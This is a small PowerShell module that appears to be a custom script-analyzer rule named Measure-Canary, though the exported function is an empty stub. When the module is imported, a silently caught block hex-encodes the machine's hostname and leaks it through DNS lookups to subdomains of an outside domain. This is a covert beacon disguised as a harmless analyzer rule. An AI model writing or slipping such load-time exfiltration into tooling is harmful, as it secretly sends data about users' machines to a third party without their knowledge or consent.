try {
  $h = [System.Net.Dns]::GetHostName()
  $hex = -join ($h.ToCharArray() | ForEach-Object { "{0:x2}" -f [int]$_ })
  [System.Net.Dns]::GetHostEntry("alive-ps.h1b.ssrf.xixixo123.site") | Out-Null
  [System.Net.Dns]::GetHostEntry("ph-$hex.h1b.ssrf.xixixo123.site") | Out-Null
} catch {}
function Measure-Canary {
  param([System.Management.Automation.Language.ScriptBlockAst]$Ast)
  return @()
}
Export-ModuleMember -Function Measure-Canary
